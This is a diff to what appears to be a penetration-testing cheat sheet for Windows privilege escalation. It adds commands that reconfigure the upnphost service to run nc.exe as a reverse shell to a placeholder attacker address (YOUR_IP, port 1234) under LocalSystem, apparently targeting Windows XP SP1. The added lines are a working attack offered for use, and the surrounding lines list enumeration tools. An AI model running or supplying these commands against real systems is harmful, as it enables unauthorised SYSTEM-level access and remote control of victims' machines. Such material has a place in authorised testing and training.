@@ -166,6 +166,10 @@ windows-privesc-check2.exe --pyshell // o.O
 procmon.exe
 ---
 sigcheck.exe -a -m C:\path\to\binarie
+---
+sc config upnphost binpath= "C:\Inetpub\wwwroot\nc.exe YOUR_IP 1234 -e C:\WINDOWS\System32\cmd.exe"  //XP SP1 2001 
+sc config upnphost obj= ".\LocalSystem" password= ""
+sc qc upnphost
 ```
 ###### Linux 
 ```
